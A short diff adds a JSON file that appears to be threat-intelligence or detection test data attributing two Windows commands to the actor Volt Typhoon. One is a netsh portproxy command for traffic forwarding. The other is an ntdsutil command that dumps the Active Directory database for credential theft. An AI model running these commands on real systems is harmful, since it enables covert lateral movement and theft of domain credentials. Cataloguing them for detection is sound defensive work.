@@ -1,0 +1,14 @@
+[
+  {
+    "Timestamp": "2026-10-03T17:00:00Z",
+    "Command": "netsh interface portproxy add v4tov4 listenport=50000 connectaddress=10.10.1.20 connectport=445",
+    "Actor": "Volt Typhoon",
+    "Tactic": "Command and Control"
+  },
+  {
+    "Timestamp": "2026-10-03T17:01:00Z",
+    "Command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\pro\" q q",
+    "Actor": "Volt Typhoon",
+    "Tactic": "Credential Access"
+  }
+]
